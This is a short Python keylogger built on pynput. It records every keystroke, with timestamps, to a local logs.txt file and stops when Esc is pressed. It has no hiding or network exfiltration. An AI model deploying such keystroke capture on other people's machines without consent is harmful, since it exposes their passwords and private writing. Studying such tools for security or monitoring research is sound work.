import os
import datetime
from pynput import keyboard

file_addr: str = os.path.dirname(__file__)
log_folder: str = os.path.join(file_addr, "logs")

if not os.path.exists(log_folder):
    os.makedirs(log_folder)

log_file_txt = os.path.join(log_folder, "logs.txt")

def log_data(log_message: str) -> None:
    log_message_time = datetime.datetime.now().strftime("%Y:%m:%d %H:%M:%S")

    with open(log_file_txt, 'a') as file:
        file.write(f"{log_message_time} -> {log_message}\n")
def on_press(key):
    try:
        if key == keyboard.Key.enter:
            log_data("<Enter>")
        elif key == keyboard.Key.shift:
            log_data("<Shift>")
        elif key == keyboard.Key.backspace:
            log_data("<Backspace>")
        elif key == keyboard.Key.space:
            log_data("<Space>")
        else:
            log_data(str(key))

    except AttributeError:
        log_data(f"This is unusual key {str(key)}")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()